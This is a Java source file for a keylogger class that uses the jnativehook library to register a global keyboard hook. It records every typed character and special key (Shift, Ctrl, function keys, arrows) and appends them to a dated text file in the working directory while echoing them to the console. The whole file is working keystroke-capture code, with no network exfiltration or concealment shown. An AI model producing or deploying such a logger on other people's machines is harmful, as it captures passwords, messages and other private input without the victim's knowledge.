package org.avsharma.keylogger;

import java.io.BufferedWriter;
import java.io.FileWriter;
import java.io.IOException;
import java.text.DateFormat;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.logging.Level;
import java.util.logging.Logger;

import org.jnativehook.GlobalScreen;
import org.jnativehook.NativeHookException;
import org.jnativehook.keyboard.NativeKeyEvent;
import org.jnativehook.keyboard.NativeKeyListener;

/*
 * @author: av-sharma
 */

public class KeyLogger extends javax.swing.JFrame implements NativeKeyListener {
	private static final long serialVersionUID = -2596279782385978797L;

	private static Logger logger = Logger.getLogger(GlobalScreen.class.getPackage().getName());

	private static String fileLocation = System.getProperty("user.dir") + "/";
	private static String fileName = "keylogger";

	private static DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd");

	public void saveLog(String log) {
		try (BufferedWriter bw = new BufferedWriter(
				new FileWriter(fileLocation + fileName + "-" + dateFormat.format(new Date()) + ".txt", true))) {
			bw.write(log);
			bw.flush();
		} catch (IOException e) {
			System.err.println("ERROR!! IOException.");
			e.printStackTrace();
			Runtime.getRuntime().exit(1);
		}
	}

	@Override
	public void nativeKeyPressed(NativeKeyEvent nativeKeyEvent) {
//        System.out.println("Key Pressed: " + NativeKeyEvent.getKeyText(nativeKeyEvent.getKeyCode()) + " : " + nativeKeyEvent.getKeyCode());
		switch (nativeKeyEvent.getKeyCode()) {
		case 1:
			saveLog("[Esc]");
			System.out.print("[Esc]");
			break;
		case 15:
			saveLog("[Tab]");
			System.out.print("[Tab]");
			break;
		case 58:
			saveLog("[CapsLock]");
			System.out.print("[CapsLock]");
			break;
		case 42:
			System.out.print("[L Shift]");
			saveLog("[L Shift]");
			break;
		case 29:
			System.out.print("[L Ctrl]");
			saveLog("[L Ctrl]");
			break;
		case 56:
			System.out.print("[L Alt]");
			saveLog("[L Alt]");
			break;
		case 3640:
			System.out.print("[R Alt]");
			saveLog("[R Alt]");
			break;
		case 3613:
			System.out.print("[R Ctrl]");
			saveLog("[R Ctrl]");
			break;
		case 57419:
			System.out.print("[Left]");
			saveLog("[Left]");
			break;
		case 57416:
			System.out.print("[Up]");
			saveLog("[Up]");
			break;
		case 57424:
			System.out.print("[Down]");
			saveLog("[Down]");
			break;
		case 57421:
			System.out.print("[Right]");
			saveLog("[Right]");
			break;
		case 3612:
		case 28:
			System.out.print("[Enter]");
			saveLog("[Enter]" + "\n");
			break;
		case 54:
			System.out.print("[R Shift]");
			saveLog("[R Shift]");
			break;
		case 14:
			System.out.print("[Backspace]");
			saveLog("[Backspace]");
			break;
		case 69:
			System.out.print("[Num Lock]");
			saveLog("[Num Lock]");
			break;
		case 3657:
			System.out.print("[Page Up]");
			saveLog("[Page Up]");
			break;
		case 3665:
			System.out.print("[Page Down]");
			saveLog("[Page Down]");
			break;
		case 3655:
			System.out.print("[Home]");
			saveLog("[Home]");
			break;
		case 3663:
			System.out.print("[End]");
			saveLog("[End]");
			break;
		case 3667:
			System.out.print("[Delete]");
			saveLog("[Delete]");
			break;
		case 3666:
			System.out.print("[Insert]");
			saveLog("[Insert]");
			break;
		case 3639:
			System.out.print("[PrtScr]");
			saveLog("[PrtScr]");
			break;
		case 88:
			System.out.print("[F12]");
			saveLog("[F12]");
			break;
		case 87:
			System.out.print("[F11]");
			saveLog("[F11]");
			break;
		case 68:
			System.out.print("[F10]");
			saveLog("[F10]");
			break;
		case 67:
			System.out.print("[F9]");
			saveLog("[F9]");
			break;
		case 66:
			System.out.print("[F8]");
			saveLog("[F8]");
			break;
		case 65:
			System.out.print("[F7]");
			saveLog("[F7]");
			break;
		case 64:
			System.out.print("[F6]");
			saveLog("[F6]");
			break;
		case 63:
			System.out.print("[F5]");
			saveLog("[F5]");
			break;
		case 62:
			System.out.print("[F4]");
			saveLog("[F4]");
			break;
		case 61:
			System.out.print("[F3]");
			saveLog("[F3]");
			break;
		case 60:
			System.out.print("[F2]");
			saveLog("[F2]");
			break;
		case 59:
			System.out.print("[F1]");
			saveLog("[F1]");
			break;
		}
	}

	@Override
	public void nativeKeyReleased(NativeKeyEvent e) {
	}

	@Override
	public void nativeKeyTyped(NativeKeyEvent e) {
		System.out.print(String.valueOf(e.getKeyChar()));
		saveLog(String.valueOf(e.getKeyChar()));
	}

	public static void main(String[] args) {
		System.out.println("SAVE FILE LOCATION: " + fileLocation);

		try {
			GlobalScreen.registerNativeHook();
			// Disable logging first
			logger.setLevel(Level.WARNING);
			logger.setUseParentHandlers(false);
		} catch (NativeHookException e) {
			System.err.println("ERROR!! Problem registering native hook.");
			System.err.println(e.getMessage());
			e.printStackTrace();
			System.exit(1);
		}

		GlobalScreen.addNativeKeyListener(new KeyLogger());
	}
}
